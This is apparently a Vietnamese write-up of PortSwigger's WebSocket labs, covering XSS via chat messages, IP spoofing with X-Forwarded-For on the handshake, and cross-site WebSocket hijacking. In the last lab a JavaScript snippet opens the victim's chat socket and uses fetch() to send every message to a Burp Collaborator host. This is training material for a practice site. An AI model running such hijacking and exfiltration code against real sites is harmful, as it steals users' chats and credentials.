---
title: '[PortSwigger] - Websocket'
slug: websocket
type: writeup
date: 2022-01-01
summary: '[WebSockets](https://portswigger.net/web-security/websockets)...'
tags: [security, writeup]
---

WebSocket là một giao thức giúp truyền dữ liệu giữa mô hình client-server qua 1 kết nối TCP duy nhất. Giao thức này sử dụng port 80 và 443 và nó là 1 phần của HTML5. Vì vậy nên giao thức websocket có thể hoạt động trên các cổng web tiêu chuẩn.
Không giống với giao thức HTTP là cần client chủ động gửi yêu cầu cho server, client sẽ chời đợi để nhận được dữ liệu từ server. Hay nói cách khác với giao thức Websocket thì server có thể chủ động gửi thông tin đến client mà không cần phải có yêu cầu từ client.
WebSockets đặc biệt hữu ích trong các trường hợp yêu cầu độ trễ thấp hoặc thông báo do server khởi tạo, chẳng hạn như nguồn cấp dữ liệu tài chính theo thời gian thực.
WebSockets được sử dụng cho tất cả các loại mục đích, bao gồm thực hiện các hành động của users và truyền thông tin nhạy cảm. Hầu như bất kỳ lỗ hổng bảo mật web nào phát sinh với HTTP thông thường cũng có thể phát sinh liên quan đến giao tiếp WebSockets.
### Manipulating WebSocket traffic - Thao tác lưu lượng truy cập WebSocket
Việc tìm kiếm các lỗ hổng bảo mật của WebSockets thường liên quan đến việc thao tác chúng theo những cách mà ứng dụng không mong đợi. Chúng ta có thể sử dụng BurpSuite tìm kiếm.
Chúng ta có thể sử dụng Burp Suite để:
```
+ Chặn và sửa đổi thông báo WebSocket.
+ Phát lại và tạo các thông báo WebSocket mới.
+ Thao tác các kết nối WebSocket.
```
### WebSockets security vulnerabilities - Các lỗ hổng bảo mật của WebSockets
Trên thực tế, như đã nhắc đến ở trên bất kỳ lỗ hổng bảo mật web nào cũng có thể phát sinh liên quan đến WebSockets:
```
+ Input do users cung cấp được truyền đến server có thể được xử lý theo những cách không an toàn, dẫn đến các lỗ hổng như SQL Injection  hoặc XML External entity injection.
+ Một số lỗ hổng bảo mật được tiếp cận thông qua WebSockets có thể chỉ có thể được phát hiện bằng các kỹ thuật out-of-band (OAST).
+ Nếu dữ liệu do hacker kiểm soát được truyền qua WebSockets đến những users ứng dụng khác, thì nó có thể dẫn đến XSS hoặc các lỗ hổng client-side khác.
```
## WebSockets Lab
### Lab: Manipulating WebSocket messages to exploit vulnerabilities
Bài lab đã mô tả cho chúng ta biết, lỗ hổng nằm ở live chat sử dụng Websockets, và yêu cầu chúng ta hiện lên thông báo aler()(lỗ hổng XSS) để hoàn thành bài lab.
Truy cập vào bài lab chúng ta thấy được 1 web site bán hàng, để ý ở góc phải chúng ta thấy được chức năng live chat để exploit.
Sau khi vào chức năng live chat chúng ta gửi 1 đoạn chat tùy ý và dùng burp suite bắt lại request để xử lí.
Chúng ta thay message đã bắt được bằng cheat sheet:
```
```
### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
Bài lab tiếp theo cũng tương tự như bài trước và chúng ta  khai thác bằng message.
Tuy nhiên khi chúng ta làm tương tự bài trước thì phát hiện ra cheat sheet :
```
```
Đã bị block và chúng ta không thể truy cập vào live chat được nữa.
Tuy nhiên chúng ta có thể khai thác giao thức bắt tay này của WebSockets bằng cách giả mạo các tiêu đề HTTP. Vì giao thức này đặt “niềm tin” vào các tiêu đề để thực hiện các quy định bảo mật. ĐIều đó tạo cơ hội khai thác cho chúng ta bằng cách thêm header sau vào yêu cầu handshake để giả mạo địa chỉ IP :
```
X-Forwarded-For: 1.1.1.1
```
Sau đó dùng cheat sheet như sau để bypass qua blacklist của web site:
```
```
*solve.jpg?raw=true)
### Lab: Cross-site WebSocket hijacking
Bài lab này hoàn toàn khác so với 2 bài trên, theo mô tả thì chúng ta vẫn sẽ khai thác từ live chat nhưng sẽ sử dụng hỗ trợ từ burp suite để sử dụng 1 server khác đê leak thông tin username và passwod.
Login thành công thì chúng ta solve bài lab
Để làm được bài này thì chúng ta sẽ xem qua 1 vài khái niệm mới như là  *What is cross-site WebSocket hijacking? - Chiếm quyền điều khiển WebSocket trên nhiều trang web là gì?*
Lỗ hổng chiếm quyền này có liên quán đến lỗ hổng cross-site request forgery (CSRF). Nó xảy ra khi yêu cầu bắt tay của WebSockets chỉ dựa vào cookie HTTP để xử lý session mà không sử dụng CSRF token hay những token khác.
Hacker có thể tạo một trang web độc hại trên tên miền của chính chúng, trang này thiết lập kết nối WebSocket giữa các trang với ứng dụng dễ bị tấn công. Ứng dụng sẽ xử lý kết nối trong bối cảnh phiên của users nạn nhân với ứng dụng.
Trang của hacker sau đó có thể gửi các tin nhắn tùy ý đến máy chủ thông qua kết nối và đọc nội dung của các tin nhắn được nhận lại từ máy chủ. Điều này có nghĩa là, không giống như CSRF thông thường, hacker có được sự tương tác hai chiều với ứng dụng bị xâm phạm.
*Performing a cross-site WebSocket hijacking attack - Thực hiện tấn công chiếm quyền điều khiển WebSocket trên nhiều trang web*
Vậy để có thể thực hiện được cuộc tấn công này chúng ta cần phải xem xét các lần bắt tay WebSocket mà ứng dụng thực hiện và xác định xem chúng có được bảo vệ chống lại CSRF hay không.
Nếu yêu cầu bắt tay WebSocket dễ bị CSRF tấn công, thì trang web của hacker có thể thực hiện yêu cầu trên nhiều trang web để mở một WebSocket trên trang web dễ bị tấn công. Điều gì xảy ra tiếp theo trong cuộc tấn công phụ thuộc hoàn toàn vào logic của ứng dụng và cách nó đang sử dụng WebSockets. Cuộc tấn công có thể bao gồm:
```
+ Gửi tin nhắn WebSocket để thay mặt user nạn nhân thực hiện các hành động trái phép.
+ Gửi tin nhắn WebSocket để truy xuất dữ liệu nhạy cảm.
+ Đôi khi, chỉ chờ tin nhắn đến chứa dữ liệu nhạy cảm.
```
Truy cập vào bài lab thì chúng ta có được 1 trăng web bán hàng có chức năng livechat.
Truy cập vào phần livechat sử dụng và bắt lại request
Chúng ta sẽ dựa vào cuộc tấn công ngoài bằng tần OAST để leak ra toàn bộ những cuộc trò chuyện trước đó trong ứng dụng vì mấy thấy có hộ trợ server exploit.
Truy cập vào server exploit và sủ dụng script sau để tấn công:
```
  var ws = new WebSocket('wss://acd51ff81f80bcacc005333f003b003a.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://p0qrlqtpfrm7p6nm1tb2aq9t5kbbz0.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
  };
```
Sau đó store vào trang web victim và Deliver to victim.
BurpSuite có hỗ trợ chúng ta những client để bắt lại những request theo cách tấn công OAST. Chúng ta sử dụng chức nằng Collaborator Client .
Sau đó pull các request về và kiểm tra thì vô tình chúng ta thấy đã có người nhắn tk và mk của 1 account trong livechat trước đó. Sử dụng nó và login vào trang web.